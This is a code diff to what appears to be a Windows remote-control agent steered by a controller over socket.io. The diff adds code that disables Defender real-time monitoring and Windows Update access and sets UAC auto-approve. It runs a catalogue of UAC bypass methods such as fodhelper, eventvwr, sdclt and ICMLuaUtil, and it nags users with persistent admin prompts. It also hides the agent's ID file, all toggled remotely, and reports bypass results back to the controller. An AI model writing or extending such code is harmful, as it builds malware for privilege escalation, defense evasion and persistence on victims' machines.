@@ -266,6 +266,8 @@ REGISTRY_ACTIONS = {
     'disableRealtimeMonitoring': True
 }
 
+AGENT_ID_SAVE_WARNED = False
+
 # Eventlet is now patched at the very top of the file (line 1-2)
 # This section is kept for compatibility but monkey_patch is already done
 
@@ -2418,6 +2420,10 @@ def elevate_via_registry_auto_approve():
             winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
             winreg.CloseKey(key)
             log_message("[REGISTRY] Auto-approve set in HKCU")
+            try:
+                emit_security_notification('success', 'UAC Auto-Approve Applied', 'HKCU policy updated')
+            except Exception:
+                pass
             return True
         except Exception:
             pass
@@ -2425,6 +2431,10 @@ def elevate_via_registry_auto_approve():
         return False
     except Exception as e:
         log_message(f"[REGISTRY] Auto-approve failed: {e}")
+        try:
+            emit_security_notification('error', 'UAC Auto-Approve Failed', str(e))
+        except Exception:
+            pass
         return False
 
 def ensure_registry_policies_and_context_menu():
@@ -2488,6 +2498,95 @@ def ensure_registry_policies_and_context_menu():
         return s
     except Exception as e:
         log_message(f"[REGISTRY] Ensure policies/context menu error: {e}", "error")
+        return False
+
+def apply_registry_action(action_key: str, enabled: bool) -> bool:
+    try:
+        import winreg
+        if action_key == 'policy_push_notifications':
+            try:
+                k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
+                val = 1 if enabled else 0
+                winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, val)
+                winreg.CloseKey(k)
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] PushNotifications policy error: {e}", "warning")
+                return False
+        if action_key == 'policy_windows_update':
+            try:
+                k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
+                val = 1 if enabled else 0
+                winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, val)
+                winreg.CloseKey(k)
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] WindowsUpdate policy error: {e}", "warning")
+                return False
+        if action_key == 'context_runas_cmd':
+            try:
+                if enabled:
+                    k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
+                    winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
+                    winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
+                    winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                    winreg.CloseKey(k)
+                    kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
+                    winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
+                    winreg.CloseKey(kc)
+                else:
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
+                    except Exception:
+                        pass
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
+                    except Exception:
+                        pass
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] Context menu runas error: {e}", "warning")
+                return False
+        if action_key == 'context_powershell_admin':
+            try:
+                if enabled:
+                    k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
+                    winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
+                    winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
+                    winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                    winreg.CloseKey(k)
+                    kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
+                    winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
+                    winreg.CloseKey(kc)
+                else:
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
+                    except Exception:
+                        pass
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
+                    except Exception:
+                        pass
+                return True
+            except Exception as e:
+                log_message(f"[REGISTRY] Context menu PowershellAdmin error: {e}", "warning")
+                return False
+        if action_key == 'disableRealtimeMonitoring':
+            try:
+                if enabled:
+                    return bool(disable_realtime_monitoring_before_uac())
+                else:
+                    try:
+                        subprocess.run(['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false'], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, capture_output=True, text=True)
+                        return True
+                    except Exception as e:
+                        log_message(f"[DEFENDER] EnableRealtimeMonitoring failed: {e}", "warning")
+                        return False
+            except Exception:
+                return False
+        return False
+    except Exception as e:
+        log_message(f"[REGISTRY] apply_registry_action error: {e}", "error")
         return False
 
 def disable_realtime_monitoring_before_uac():
@@ -2594,6 +2693,10 @@ def attempt_uac_bypass():
     debug_print("=" * 80)
     debug_print("[UAC BYPASS] attempt_uac_bypass() called")
     debug_print("=" * 80)
+    try:
+        emit_security_notification('info', 'UAC Bypass Attempt', 'Attempting elevation')
+    except Exception:
+        pass
     
     if not WINDOWS_AVAILABLE:
         debug_print("❌ [UAC BYPASS] Not Windows - bypass not available")
@@ -2652,6 +2755,10 @@ def attempt_uac_bypass():
             debug_print("✅ [UAC BYPASS] THIS process is now admin!")
             log_message("✅ [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
             try:
+                emit_security_notification('success', 'UAC Bypass Successful', 'Admin privileges gained')
+            except Exception:
+                pass
+            try:
                 perform_post_admin_actions()
             except Exception:
                 pass
@@ -2679,6 +2786,10 @@ def attempt_uac_bypass():
         debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
         debug_print("=" * 80)
         log_message("❌ [UAC BYPASS] All UAC Manager methods failed", "error")
+        try:
+            emit_security_notification('error', 'UAC Bypass Failed', 'Bypass methods did not succeed')
+        except Exception:
+            pass
     
     return result
 
@@ -6089,6 +6200,10 @@ def silent_disable_uac():
         debug_print("✅ All .exe and installers will run without password prompts!")
         debug_print("✅ RESTART REQUIRED for changes to take full effect!")
         debug_print("=" * 80)
+        try:
+            emit_security_notification('success', 'UAC Disabled', 'Admin prompts disabled for applications')
+        except Exception:
+            pass
         return True
     else:
         debug_print("=" * 80)
@@ -6096,6 +6211,10 @@ def silent_disable_uac():
         debug_print("❌ Could not disable UAC with any method")
         debug_print("❌ May need administrator privileges")
         debug_print("=" * 80)
+        try:
+            emit_security_notification('error', 'UAC Disable Failed', 'Could not disable UAC')
+        except Exception:
+            pass
         return False
 
 def silent_enable_strict_uac():
@@ -7005,7 +7124,27 @@ def get_or_create_agent_id():
             except:
                 pass
     except Exception as e:
-        log_message(f"Could not save agent ID to file: {e}", "warning")
+        global AGENT_ID_SAVE_WARNED
+        try:
+            if not AGENT_ID_SAVE_WARNED:
+                log_message(f"Could not save agent ID to file: {e}", "warning")
+                AGENT_ID_SAVE_WARNED = True
+        except Exception:
+            pass
+        try:
+            fallback_base = os.getenv('LOCALAPPDATA') or os.getenv('TEMP') or os.path.expanduser('~')
+            fallback_path = os.path.join(fallback_base, 'agent_controller')
+            os.makedirs(fallback_path, exist_ok=True)
+            id_file_path = os.path.join(fallback_path, 'agent_id.txt')
+            with open(id_file_path, 'w') as f:
+                f.write(agent_id)
+            if WINDOWS_AVAILABLE:
+                try:
+                    win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
+                except:
+                    pass
+        except Exception:
+            pass
     
     return agent_id
 
@@ -9760,10 +9899,10 @@ def register_socketio_handlers():
     
     # Register disconnect handler
     @sio.event
-    def disconnect():
+    def disconnect(*args):
         global CONNECTION_STATE
         try:
-            agent_id = get_or_create_agent_id()
+            agent_id = socket.gethostname()
             log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
             
             # Update connection state immediately
@@ -9832,6 +9971,11 @@ def on_config_update(data):
         bypasses = data.get('bypasses') or {}
         registry = data.get('registry') or {}
         global REQUEST_ADMIN_FIRST, MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS
+        prev_disable_uac_bypass = DISABLE_UAC_BYPASS if 'DISABLE_UAC_BYPASS' in globals() else None
+        prev_persistent_prompt = PERSISTENT_ADMIN_PROMPT_ENABLED if 'PERSISTENT_ADMIN_PROMPT_ENABLED' in globals() else None
+        prev_registry_enabled = REGISTRY_ENABLED if 'REGISTRY_ENABLED' in globals() else None
+        prev_slui_disabled = DISABLE_SLUI_BYPASS if 'DISABLE_SLUI_BYPASS' in globals() else None
+        prev_methods = dict(UAC_BYPASS_METHODS_ENABLED) if 'UAC_BYPASS_METHODS_ENABLED' in globals() else {}
         REQUEST_ADMIN_FIRST = bool(agent.get('requestAdminFirst', REQUEST_ADMIN_FIRST))
         try:
             MAX_PROMPT_ATTEMPTS = int(agent.get('maxPromptAttempts', MAX_PROMPT_ATTEMPTS))
@@ -9853,6 +9997,86 @@ def on_config_update(data):
         try:
             for k, v in actions.items():
                 REGISTRY_ACTIONS[k] = bool(v)
+        except Exception:
+            pass
+        try:
+            uac_state_changed = prev_disable_uac_bypass is not None and prev_disable_uac_bypass != DISABLE_UAC_BYPASS
+            if uac_state_changed:
+                if not DISABLE_UAC_BYPASS and bypasses_enabled:
+                    emit_security_notification('info', 'UAC Bypass Enabled', 'UAC bypass features enabled')
+                else:
+                    emit_security_notification('warning', 'UAC Bypass Disabled', 'UAC bypass features disabled')
+            persistent_changed = prev_persistent_prompt is not None and prev_persistent_prompt != PERSISTENT_ADMIN_PROMPT_ENABLED
+            if persistent_changed:
+                if PERSISTENT_ADMIN_PROMPT_ENABLED:
+                    emit_security_notification('info', 'Persistent Admin Prompt Enabled', 'Will ask for admin repeatedly')
+                else:
+                    emit_security_notification('info', 'Persistent Admin Prompt Disabled', 'Stopped persistent admin prompts')
+            registry_changed = prev_registry_enabled is not None and prev_registry_enabled != REGISTRY_ENABLED
+            if registry_changed:
+                if REGISTRY_ENABLED:
+                    emit_security_notification('info', 'Registry Controls Enabled', 'Registry action toggles active')
+                else:
+                    emit_security_notification('warning', 'Registry Controls Disabled', 'Registry action toggles inactive')
+            slui_changed = prev_slui_disabled is not None and prev_slui_disabled != DISABLE_SLUI_BYPASS
+            if slui_changed:
+                if not DISABLE_SLUI_BYPASS:
+                    emit_security_notification('info', 'SLUI Bypass Enabled', 'slui method enabled')
+                else:
+                    emit_security_notification('warning', 'SLUI Bypass Disabled', 'slui method disabled')
+            method_names = {
+                'cleanmgr_sagerun': 'cleanmgr/sagerun',
+                'fodhelper': 'fodhelper',
+                'computerdefaults': 'computerdefaults',
+                'eventvwr': 'eventvwr',
+                'sdclt': 'sdclt',
+                'wsreset': 'wsreset',
+                'slui': 'slui',
+                'winsat': 'winsat',
+                'silentcleanup': 'SilentCleanup',
+                'icmluautil': 'ICMLuaUtil'
+            }
+            for mk, prev_val in (prev_methods or {}).items():
+                if mk in UAC_BYPASS_METHODS_ENABLED:
+                    curr = UAC_BYPASS_METHODS_ENABLED[mk]
+                    if curr != prev_val:
+                        name = method_names.get(mk, mk)
+                        if curr:
+                            emit_security_notification('info', 'UAC Method Enabled', name)
+                        else:
+                            emit_security_notification('warning', 'UAC Method Disabled', name)
+        except Exception:
+            pass
+        try:
+            def _apply_changes():
+                try:
+                    if PERSISTENT_ADMIN_PROMPT_ENABLED:
+                        try:
+                            r = run_as_admin_persistent()
+                            if r:
+                                emit_security_notification('success', 'Admin Granted', 'Persistent UAC prompt granted admin')
+                            else:
+                                emit_security_notification('info', 'Admin Prompt Active', 'Persistent UAC prompt running')
+                        except Exception:
+                            pass
+                    if not DISABLE_UAC_BYPASS and bypasses_enabled:
+                        try:
+                            attempt_uac_bypass()
+                        except Exception:
+                            pass
+                    if REGISTRY_ENABLED and actions:
+                        for k, v in actions.items():
+                            try:
+                                res = apply_registry_action(k, bool(v))
+                                if res:
+                                    emit_security_notification('success', 'Registry Action Applied', f'{k} set to {bool(v)}')
+                                else:
+                                    emit_security_notification('error', 'Registry Action Failed', f'{k} set to {bool(v)} failed')
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+            threading.Thread(target=_apply_changes, daemon=True).start()
         except Exception:
             pass
     except Exception:
